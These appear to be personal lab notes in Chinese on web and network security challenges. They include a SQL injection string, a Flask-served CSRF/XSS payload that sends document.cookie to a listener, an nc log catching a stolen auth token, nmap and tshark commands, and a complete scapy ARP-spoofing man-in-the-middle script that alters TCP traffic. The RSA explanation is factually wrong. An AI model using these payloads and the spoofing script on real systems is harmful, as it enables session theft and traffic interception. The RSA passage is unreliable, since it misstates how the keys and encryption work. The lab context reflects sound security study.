# sql注入
' OR 1=1 --
# Same origin:
scheme,host,port
# curl 进行路径解析的时候会把../自动略去，注意使用url encode

# url 注入技巧
%0A换行符

# XSS：chrome访问阻止 一些端口 如 6666等，1337不会触发
# 复杂请求 + 跨域 才会触发options
hacker@web-security~xss-7:~$ nc -lv localhost 1338
Listening on localhost 1338
Connection received on localhost 36852
GET /?auth=admin|.QXygTN2wiM2cjMyEzW} HTTP/1.1
Host: localhost:1338
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://challenge.localhost/
Origin: http://challenge.localhost
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Priority: u=4d
# XSS vs crsf
XSS 直接在网站中注入scirpt
crsf 导航到我们的网站的一些脚本
# csrf越过SOP （同源保护）
flask.redirect
img不行
form 自动提交也可以

form here:
<script>document.forms[0].submit</script>

# CSRF +XSS 示例：
```py
from flask import Flask, request
import flask

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        print("Got POST:", request.form)
        return "Received."

    import requests
    from urllib.parse import quote

    payload = """<form id='f' action='http://localhost:1338' method='POST'>
    <input type='hidden' name='cookie' id='c'>
    </form><script>document.getElementById('c').value=document.cookie;document.getElementById('f').submit()</script>"""
    encoded_payload = payload
    # encoded_payload = quote(payload)
    # encoded_payload="hellO!"
    url = f"http://challenge.localhost/ephemeral?msg={encoded_payload}"

    return f"""
    <!DOCTYPE html>
    <html>
    <body>
        <h1>Welcome to my site!</h1>
        <form method="GET" action="{url}">
            <input type="hidden" name="msg" value="{encoded_payload}">
        </form>
        <script>
            setTimeout(() => document.forms[0].submit(), 500);
        </script>
    </body>
    </html>
"""

if __name__ == '__main__':
    app.run(host='hacker.localhost', port=1337, debug=True)

```
要点：
注意get 只会提交内部已有字段，与 url无关
另外：
不要quote，否则XSS 内嵌失败
# fetch 中 mode 的作用
no-cors:

https://www.google.com/search?q=fetch+mode%3Ano-cors&oq=fetch+mode%3Ano-cors&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDMzMzNqMGo0qAIAsAIB&sourceid=chrome&ie=UTF-8
限制预检，为了安全限制正文的出现，以及限制方法在一个范围。
a nice example:
https://stackoverflow.com/questions/43262121/trying-to-use-fetch-and-pass-in-mode-no-cors

# intercept communication:
网络地址中  mac vs ip：
mac设备独有，ip随地区变暖。
且 mac地址 只用于局域网设备鉴别。ip-> for complex rout
ethernet<- IP -< tcp
SYNC ->
<- SYNC and  ACK YOUR SYN
ACK ->

# ARP:address resolution protocol
由路由器进行，广播到所有mac设备 IP 同一层的.
简单来讲 这个协议基本上包含有 目标硬件地址（MAC） 所求类型 以及具体内容 + 源地址类型和具体内容（IP) 
# 网络中10.0.0/24是什么意思
前几位是子网的意思。网络号 + 主机号 = IP
# 扫描工具 nmap
sudo nmap -sn -n --stats-every 1s 10.0.0.0/24
-sn ping and ni port
-n no dns
sudo nmap -sn -n -T5 --min-parallelism 100 --min-rtt-timeout 50ms --max-retries 1 10.0.0.0/16
# tshark
跟踪流
sudo tshark -i eth0 -c 2 -T fields -e tcp.stream -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport -e tcp.flags -e tcp.len
输出内容:
tshark -i eth0 -f "port 31337 stream 0" -T fields -e data -c 150 | xxd -r -p
-f 抓包过滤
显示过滤tshark -i eth0 -Y "tcp.port == 80"
# ip:
ip addr show
sudo ip addr add 10.0.0.3/24 dev eth0
# ipconfig:
```shuchu
PS C:\Users\kokona> ipconfig

Windows IP 配置


无线局域网适配器 本地连接* 1:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . :

无线局域网适配器 本地连接* 2:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . :

无线局域网适配器 WLAN:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::3719:9b04:a84f:261e%21
   IPv4 地址 . . . . . . . . . . . . : 192.168.0.104
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.0.1

以太网适配器 蓝牙网络连接:

   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
   连接特定的 DNS 后缀 . . . . . . . :

```
默认网关的意思是，不在局域网子网中的时候，会发给路由器
"WIFI”是子网。而路由器是默认网关


tracert windows命令，给出经过的网关

# NAT：
our address -> 变成 中国电信的ip、

# 防火墙 iptables:
`iptables` 是 Linux 上经典的防火墙工具，用来设置**网络访问控制规则**。你可以用它来允许、拒绝、转发、记录各种进出网络的数据包。

---

## 🧱 iptables 基础结构

iptables 由 **表（tables）** 和 **链（chains）** 组成：

### 🔸 常用表（table）：

| 表名       | 作用              |
| -------- | --------------- |
| `filter` | 默认表，控制允许或拒绝流量   |
| `nat`    | 用于网络地址转换（如端口映射） |
| `mangle` | 修改数据包（如 TTL）    |

### 🔸 常用链（chain）：

| 链名                           | 说明               |
| ---------------------------- | ---------------- |
| `INPUT`                      | 流入本机的流量          |
| `OUTPUT`                     | 本机发出的流量          |
| `FORWARD`                    | 从一张网卡转发到另一张网卡的流量 |
| `PREROUTING` / `POSTROUTING` | 用于 NAT 转换场景      |

---

## ✅ 常见用法

### 1. 查看现有规则

```bash
sudo iptables -L -n -v
```

### 2. 允许端口（如 22）

```bash
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

### 3. 拒绝端口（如 80）

```bash
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
```

### 4. 只允许某个 IP 访问某端口

```bash
sudo iptables -A INPUT -p tcp -s 192.168.1.100 --dport 22 -j ACCEPT
```

### 5. 设置默认策略为拒绝所有流量

```bash
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT DROP
sudo iptables -P FORWARD DROP
```

> 然后你可以按需“放行”需要的服务，如 ssh、http。

---

## 🔁 清除所有规则（慎用）

```bash
sudo iptables -F        # 清除所有链中的规则
sudo iptables -X        # 删除自定义链
```

---

## 💾 保存规则（不同系统不同方式）

### Ubuntu/Debian：

```bash
sudo iptables-save > /etc/iptables/rules.v4
```

### CentOS/RHEL：

```bash
sudo service iptables save
```

---

## 🧠 小贴士

* `-A`：添加规则（Append）
* `-D`：删除规则（Delete）
* `-I`：插入规则（Insert）
* `-L`：列出规则（List）
* `-F`：清空规则（Flush）

---

## 📘 示例：只允许 SSH，拒绝其他

```bash
sudo iptables -F
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

---

如果你告诉我你想做什么（比如“只允许某个端口”，“屏蔽某个 IP”），我可以直接给你规则。需要吗？

# 三次握手代码：
```py
from scapy.all import *
import time
sniffer = AsyncSniffer()
sniffer.start()
# send the first syn
send(IP(dst="10.0.0.2")/TCP(sport=31337, dport=31337, seq=31337, flags="S"))
time.sleep(0.1)
result = sniffer.stop()
result[0]
def return_target_pack(pack):
    try:
        if pack[TCP]and  pack[IP].dst=="10.0.0.1":
            return True
        return False
    except:
        return False
client_pack = result.filter(return_target_pack)[0]

seq_number = client_pack[TCP].seq
sniffer.start()
# 注意seq +1 以及ack +1
send(IP(dst="10.0.0.2")/TCP(sport=31337, dport=31337, seq=31338,ack=seq_number+1, flags="A"))
time.sleep(1)

result = sniffer.stop()
print(result)
result[0].show()

```
# man in the middle writeup:
这个地方的关键是，ip转发机制的存在使得你必须在echo来之前发送掉对应的请求。
```py
from scapy.all import *
import threading
import time
import sys
import os

# 配置
real_ip = "10.0.0.3"
target_ip = "10.0.0.2"
server_ip = "10.0.0.3"
iface = conf.iface  # 默认网络接口

# 验证 root 权限
if os.geteuid() != 0:
    print("需要 root 权限运行！")
    sys.exit(1)

import os

def disable_ip_forward_sysctl():
    ret = os.system("sysctl -w net.ipv4.ip_forward=0")
    if ret == 0:
        print("IP forwarding disabled via sysctl.")
    else:
        print("Failed to disable IP forwarding via sysctl.")

disable_ip_forward_sysctl()


# 获取 MAC 地址并验证
def get_mac(ip):
    try:
        mac = getmacbyip(ip)
        if not mac:
            raise ValueError(f"无法获取 IP {ip} 的 MAC 地址")
        return mac
    except Exception as e:
        print(f"获取 MAC 地址失败 ({ip}): {e}")
        sys.exit(1)

try:
    my_mac = get_if_hwaddr(iface)
    target_mac = get_mac(target_ip)
    server_mac = get_mac(server_ip)
    print(f"我的 MAC: {my_mac}, 目标 MAC: {target_mac}, 服务器 MAC: {server_mac}")
except Exception as e:
    print(f"初始化失败: {e}")
    sys.exit(1)

# 持续发送 ARP 欺骗包
def send_arp_spoof():
    while True:
        try:
            sendp(Ether(dst=target_mac, src=my_mac) /
                  ARP(op=2, psrc=server_ip, hwsrc=my_mac, pdst=target_ip),
                  iface=iface, verbose=0)
            sendp(Ether(dst=server_mac, src=my_mac) /
                  ARP(op=2, psrc=target_ip, hwsrc=my_mac, pdst=server_ip),
                  iface=iface, verbose=0)
            time.sleep(5)
        except Exception as e:
            print(f"ARP 欺骗错误: {e}")
            time.sleep(5)

# 数据包处理回调函数
def handle_packet(pack):
    try:
        if (not pack.haslayer(IP) or not pack.haslayer(TCP)) or(pack[Ether].src==my_mac):
            return  # 忽略非 IP/TCP 包

        # 调试：打印原始包信息
        print(f"捕获包: {pack.summary()}")
        pack[TCP].show()
        # 创建新数据包副本以避免修改原始包
        new_pack = None 
        if pack.haslayer(Raw):
            new_pack = Ether()/IP()/TCP()/Raw(load=pack[Raw].load)
        else:
            new_pack = Ether()/IP()/TCP()

        if pack[IP].src == target_ip:
            print("SRC: 10.0.0.2")
            new_pack[Ether].dst = server_mac
            new_pack[Ether].src = my_mac
            new_pack[IP].dst = server_ip
            new_pack[IP].src = target_ip

            new_pack[TCP].sport = pack[TCP].sport
            new_pack[TCP].dport = pack[TCP].dport
            new_pack[TCP].seq = pack[TCP].seq
            new_pack[TCP].ack = pack[TCP].ack
            new_pack[TCP].flags = pack[TCP].flags

            if pack.haslayer(Raw):
                if pack[Raw].load == b"echo":
                    print("修改: echo -> flag")
                    new_pack[Raw].load = b"flag"
                if pack[Raw].load.startswith(b"pwn"):
                    print("触发退出条件")
                    sys.exit(0)
                if pack[Raw].load == b"Hello, World!":
                    print(" I FIND!!!!!!")
                    return 
                print(f"Payload: {new_pack[Raw].load}")
        elif pack[IP].src == server_ip:
            print("SRC: 10.0.0.3")
            new_pack[Ether].dst = target_mac
            new_pack[Ether].src = my_mac
            new_pack[IP].dst = target_ip
            new_pack[IP].src = server_ip

            new_pack[TCP].sport = pack[TCP].sport
            new_pack[TCP].dport = pack[TCP].dport
            new_pack[TCP].seq = pack[TCP].seq
            new_pack[TCP].ack = pack[TCP].ack
            new_pack[TCP].flags = pack[TCP].flags
            
            if pack.haslayer(Raw):
                print(f"Payload: {pack[Raw].load}")
                if pack[Raw].load == b'command: ':
                    new_pack[Ether].dst = my_mac
                    new_pack[Ether].src = target_mac
                    new_pack[IP].dst = server_ip
                    new_pack[IP].src = target_ip

                    new_pack[TCP].sport =pack[TCP].dport 
                    new_pack[TCP].dport =  pack[TCP].sport
                    new_pack[TCP].seq = pack[TCP].ack 
                    new_pack[TCP].ack =  pack[TCP].seq + 9
                    new_pack[TCP].flags = "PA"

                    new_pack[Raw].load= b"flag"
        # 调试：发送前打印校验和
        print(f"发送包: {new_pack.summary()}")
        print(f"IP 校验和: {new_pack[IP].chksum}, TCP 校验和: {new_pack[TCP].chksum}")
        sendp(new_pack, iface=iface, verbose=0)

        # 发送数据包
    except Exception as e:
        print(f"处理数据包错误: {e}")
        raise

# 主程序
def main():
    # 启动 ARP 欺骗线程
    arp_thread = threading.Thread(target=send_arp_spoof, daemon=True)
    arp_thread.start()

    # 启动嗅探器
    try:
        sniffer = AsyncSniffer(filter="tcp", iface=iface, prn=handle_packet)
        print("开始嗅探...")
        sniffer.start()
        sniffer.join()
    except KeyboardInterrupt:
        print("用户中断，退出...")

        sys.exit(0)
    except Exception as e:
        print(f"嗅探错误: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

# 密码学：
RSA 加密基本原理：
公钥是一个p和 一个因数
私钥是一个q和一个因数
数据m 加密等于：
m^p
私钥m^PQ mod n 就得到私有数据

# ONEPAD加密
一个 字节本 进行一次加密（抑或）然而无法多次使用 否则不安全

# AES 填充方块
AES 加密算法要求输入数据块大小为 16 字节（128 位），因此在加密时需要对输入数据进行填充，以满足块大小要求。常见的填充方式有：

1. **PKCS#7 填充**：
   - 在数据末尾添加若干字节，每个字节的值都为填充的字节数。例如，如果需要填充 5 个字节，则添加 5 个字节值为 0x05。

2. **Zero 填充**：
   - 在数据末尾添加零字节，直到达到块大小。这种方式不够安全，因为解密时无法确定原始数据长度。

3. **ANSI X.923 填充**：
   - 在数据末尾添加若干个零字节，最后一个字节为填充的字节数。

4. **ISO 10126 填充**：
   - 在数据末尾添加随机字节，最后一个字节为填充的字节数。

在实际应用中，PKCS#7 填充是最常用的填充方式。解密时需要根据填充方式去除填充字节，以恢复原始数据。
如果刚好满足16 会自动填充一个